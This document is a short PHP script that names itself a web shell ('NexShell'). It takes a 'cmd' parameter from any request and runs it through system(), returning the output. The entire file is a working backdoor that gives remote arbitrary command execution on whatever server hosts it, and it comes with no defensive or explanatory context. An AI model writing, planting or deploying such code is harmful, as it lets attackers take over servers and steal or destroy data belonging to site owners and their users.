<?php
// NexShell WebShell — system()
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    system($cmd . ' 2>&1');
}
?>